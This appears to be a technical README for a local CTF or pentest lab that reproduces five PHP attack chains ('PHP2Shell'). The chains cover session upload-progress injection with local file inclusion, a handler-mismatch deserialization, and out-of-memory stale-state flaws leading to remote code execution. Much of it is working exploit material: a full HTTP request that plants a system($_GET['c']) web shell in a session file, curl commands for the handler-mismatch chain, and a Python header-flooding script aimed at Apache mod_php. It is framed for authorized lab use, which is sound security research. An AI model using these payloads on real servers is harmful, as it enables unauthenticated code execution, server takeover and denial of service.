# PHP2Shell attack chains — Technical detail

This document describes the **five attack chains** (A, B, C, D, E) documented in the PHP2Shell research, focusing on the three reproducible in this lab.

---

## Chain A — Session File Injection + LFI → RCE

**Preconditions:**
- `session.upload_progress.enabled = On` (default)
- `session.upload_progress.cleanup = Off` (the lab has it Off; the PHP default is On)
- `session.use_strict_mode = Off` (default)
- **Application with LFI** (local file inclusion)

**Surface:** PHP-FPM or Apache mod_php.

**Attack mechanics:**

1. **Session fixation:** because `use_only_cookies=0` (default), `PHPSESSID` can be fixed by sending it in the **multipart body** in addition to the cookie:
   ```
   Content-Disposition: form-data; name="PHPSESSID"
   
   ctfchainA000000000000000000
   ```

2. **Trigger the `upload_progress` handler:** the multipart request must include:
   - A field with `name="PHP_SESSION_UPLOAD_PROGRESS"` (the default `session.upload_progress.name`) with any value (e.g. `x`).
   - A `file` field with `filename="<payload>"`. The **filename** is what is written RAW into the session file.

3. **Inject the PHP payload into the filename:**
   ```
   Content-Disposition: form-data; name="f"; filename="<?php system('id'); ?>"
   ```
   Because `cleanup=Off`, the `sess_<SID>` file persists after the request with the PHP code inside (unsanitized).

4. **LFI → execution:** the vulnerable LFI endpoint (`vuln.php?page=...`) performs `include($_GET['page'])` without sanitization. Include the session file:
   ```
   GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000
   ```
   When included, the PHP code from the filename executes.

**Full example request (Chain A):**

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: multipart/form-data; boundary=EXPLOIT
Cookie: PHPSESSID=ctfchainA000000000000000000

--EXPLOIT
Content-Disposition: form-data; name="PHPSESSID"

ctfchainA000000000000000000
--EXPLOIT
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
--EXPLOIT
Content-Disposition: form-data; name="f"; filename="<?php system($_GET['c']); ?>"

dummy
--EXPLOIT--
```

Then:
```http
GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000&c=id HTTP/1.1
```

**Reliability:** 100% if the app has LFI.

---

## Chain B — `var_destroy` UAF → Handler Overwrite → RCE

**Preconditions:**
- Application calls `unserialize()` with controlled data.
- Destructor gadget available (a class with `__destruct`).

**Surface:** any SAPI (FPM, mod_php, CLI).

**Attack mechanics:**

`var_destroy()` frees back-reference chunks and then triggers `__destruct` **without** `serialize_lock`. A nested `unserialize()` inside the destructor reuses the freed `var_hash` → **heap-use-after-free** → function handler overwrite → RCE.

**Verification:** PoC `verify_uaf_asan.php` from the official repo, run locally with an ASAN-compiled PHP:
```bash
USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf_asan.php
```

**This lab does NOT include a controlled `unserialize()` endpoint** because Chain B is more of a gadget demo than a web surface. It can be added manually if desired.

**ASAN confirmation:** `heap-use-after-free` at `var_unserializer.c:851`.

---

## Chain C — Session Handler Mismatch → `__destruct` → RCE

**Preconditions:**
- Two directories with different `session.serialize_handler`:
  - Write directory: `php_serialize` (preserves the pipe `|` in strings).
  - Read directory: `php` (interprets `|` as a field separator).
- Shared save path (`session.save_path` points to the same directory).

**Surface:** PHP-FPM with `.user.ini` support (the PHP built-in server does NOT support `.user.ini`; this lab uses nginx → php-fpm).

**Attack mechanics:**

1. **Write with `php_serialize`:** POST to `/app/upload.php` (which has a `.user.ini` with `session.serialize_handler = php_serialize`). The filename with the pipe and the serialized object is written as-is:
   ```
   filename="x|O:8:\"stdClass\":0:{}"
   ```
   Resulting session file (serialized with `php_serialize`):
   ```
   a:1:{s:10:"upload_progress_x";a:5:{...s:4:"name";s:22:"x|O:8:\"stdClass\":0:{}"...}}
   ```

2. **Read with `php`:** GET/POST to `/api/endpoint.php` (which has a `.user.ini` with `session.serialize_handler = php`). When deserializing, the `php` handler **splits** at the first `|` → treats `O:8:\"stdClass\":0:{}` as a serialized object → instantiates `stdClass` → triggers `__destruct` during `var_hash` cleanup **even when decoding returns FAILURE**.

**Key research finding:** `__destruct` fires on **both** paths (success and failure) during var_hash cleanup after parsing.

**Example request (Chain C):**

```bash
# Write (php_serialize)
curl -X POST \
  -H "Cookie: PHPSESSID=chainC00000000000000000000" \
  -F "PHPSESSID=chainC00000000000000000000" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F 'f=@-;filename="x|O:8:\"stdClass\":0:{}"' \
  http://127.0.0.1:18080/app/upload.php <<< "dummy"

# Read (the php handler deserializes and triggers __destruct)
curl -H "Cookie: PHPSESSID=chainC00000000000000000000" \
  http://127.0.0.1:18080/api/endpoint.php
```

**Verification:** inspect PHP logs for decode-failure warnings (if `display_errors=On`), or trace `__destruct` with a real gadget.

---

## Chain D — mod_php OOM → Stale `EG()` → RCE ⚡

**Preconditions:** **NONE** (0-day with no application dependencies).

**Surface:** **Apache mod_php only** (not FPM, not CLI).

**Critical severity:** pre-authentication RCE against **any** PHP endpoint on Apache mod_php.

**Attack mechanics:**

1. **Trigger OOM during request startup:** send a POST with massive headers or a huge body that triggers a `zend_mm` OOM during `php_request_startup` → `longjmp()` skips initialization → Apache mod_php **does not kill the process** (unlike FPM, which kills the worker).

2. **Stale executor globals:** the Apache process reuses the executor with corrupt `EG()` globals (not initialized because of the `longjmp`). The next request inherits that state → UAF in shutdown paths → RCE.

**OOM strategies:**

- **Massive headers:** send thousands of `X-Custom-N: <padding>` headers to exhaust memory before body parsing.
- **Huge POST body:** `Content-Length` > `memory_limit` with a body that triggers OOM during multipart parsing.

**Example (massive headers):**

```python
import socket

def oom_headers(host, port, path):
    sock = socket.create_connection((host, port), timeout=15)
    req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
    # 100k headers of 1 KB each → ~100MB
    for i in range(100000):
        req += f"X-Custom-{i}: {'A'*1000}\r\n"
    req += "\r\n"
    sock.sendall(req.encode())
    sock.close()

oom_headers("127.0.0.1", 18081, "/index.php")
```

**Affected SAPIs:**
- Apache mod_php ✅ (confirmed)
- FPM ⚠️ (worker exit, dirty state does not persist)
- FrankenPHP ✅ (confirmed in the research)

**This lab exposes Chain D at `127.0.0.1:18081` (Apache mod_php with `memory_limit=32M`).**

**Official PoC:** `verify_oom_trigger.py` from the `ikow/php2shell-poc` repo.

---

## Chain E — FPM Session OOM → Stale `BG(unserialize)` → RCE ⚡

**Preconditions:**
- Endpoint with `session_start()` that reads a large session (~30MB).
- PHP-FPM (not mod_php).

**Surface:** PHP-FPM only.

**Attack mechanics:**

1. **Producer request:** `session_start()` decodes a ~30MB session → OOM during `php_var_unserialize` → `BG(unserialize).level` remains >0, dirty destruction state → the FPM worker **survives** (unlike FPM behavior in Chain D, here the OOM occurs in a different phase and the worker does not die).

2. **Consumer request:** trigger `upload_progress` → the `rfc1867` handler (which runs **before** `PHP_RINIT_FUNCTION(basic)`) accesses the stale `BG(unserialize)` → "Session object destruction failed" → `__destruct` on stale objects → UAF → RCE.

**Key finding:** `rfc1867` runs BEFORE `basic_rinit`, so the stale `BG(unserialize)` is accessible.

**Verification:** "Session object destruction failed" in logs during PHP Request Startup.

**Official PoC:** `verify_fpm_stale_state.py`.

**This lab exposes FPM on `:18080` / `:9000`, but does NOT include an endpoint with a large pre-populated session.** It can be created manually if you want to test Chain E.

---

## Lab endpoint chain summary

| Chain | Lab endpoint(s)                       | Reproducible OOTB | Notes                                      |
|-------|---------------------------------------|-------------------|--------------------------------------------|
| A     | `:18080/vuln.php` + `:18080/index.php` | ✅ Yes            | LFI + upload_progress, ready to use        |
| B     | (none)                                | ❌ No             | Requires `unserialize()` endpoint + gadget |
| C     | `:18080/app/` and `:18080/api/`       | ✅ Yes            | Handler mismatch via `.user.ini`           |
| D     | `:18081/index.php` (Apache mod_php)   | ✅ Yes            | mod_php OOM with `memory_limit=32M`        |
| E     | `:18080` (FPM)                        | ⚠️ Partial        | Requires a large pre-populated session     |

**For use in an authorized local CTF/pentest.**
